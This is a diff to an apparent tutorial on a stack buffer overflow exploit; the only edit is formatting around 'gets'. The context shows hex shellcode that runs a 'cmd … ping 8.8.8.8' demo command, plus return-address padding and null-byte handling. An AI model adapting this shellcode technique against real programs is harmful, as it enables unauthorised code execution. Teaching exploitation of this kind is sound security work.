@@ -135,7 +135,7 @@ We get the following exploit after adding the code to our command string.
 61 61 61 61 33 C0 89 44 24 DC 8B DC 83 EB 44 83 
 EC 50 6A 01 53 B8 90 48 CF 75 FF D0
 ```
-This code is 60B long so we need to add 4B of padding followed by the address of our code (```0x0019FF14```). We once again encounter the issue of having to write a null byte. However, the bytes we actually need to write into the buffer are ```14 FF 19 00```. Notice that the null byte is the very last byte of our exploit. Fortunately, gets stores its input as a null terminated string, so it will write this problematic byte for us. The complete shellcode therefore looks like this
+This code is 60B long so we need to add 4B of padding followed by the address of our code (```0x0019FF14```). We once again encounter the issue of having to write a null byte. However, the bytes we actually need to write into the buffer are ```14 FF 19 00```. Notice that the null byte is the very last byte of our exploit. Fortunately, ```gets``` stores its input as a null terminated string, so it will write this problematic byte for us. The complete shellcode therefore looks like this
 ```
 63 6D 64 20 2F 6B 20 73 74 61 72 74 20 63 6D 64 
 20 2F 6B 20 70 69 6E 67 20 38 2E 38 2E 38 2E 38 
